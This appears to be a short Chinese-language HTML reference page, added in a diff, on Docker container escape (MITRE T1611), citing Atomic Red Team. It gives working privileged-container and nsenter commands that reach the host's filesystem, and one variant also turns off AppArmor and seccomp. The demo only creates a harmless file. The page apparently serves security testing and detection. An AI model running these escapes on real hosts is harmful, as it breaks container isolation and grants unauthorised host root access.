@@ -1,0 +1,37 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head><script type="text/javascript" src="../page_head.js"></script>
+
+<h3><a href="../system.htm">系統</a> - Docker - Container Escape - <b>MITRE T1611</b></h3>
+<hr size="1"><br>
+<p>
+參考資訊：<br>
+https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.md<br><br>
+
+手動執行：
+</p>
+<pre>
+root@user:~# docker run --rm -it --privileged --pid=host alpine /bin/sh
+
+/ # nsenter --mount=/proc/1/ns/mnt -- /bin/bash
+
+root@xxx:/# touch /tmp/container_escape_demo
+root@xxx:/# exit
+
+/ # exit
+
+root@user:~# ls /tmp/
+    container_escape_demo
+</pre><br>
+
+<p>
+自動執行：
+</p>
+<pre>
+root@user:~# docker run -it --rm --security-opt apparmor=unconfined --security-opt seccomp=unconfined --privileged --pid=host alpine nsenter --mount=/proc/1/ns/mnt -- touch /tmp/container_escape_demo
+
+root@user:~# ls /tmp/
+    container_escape_demo
+</pre>
+
+<br><script type="text/javascript" src="../tail.js"></script>
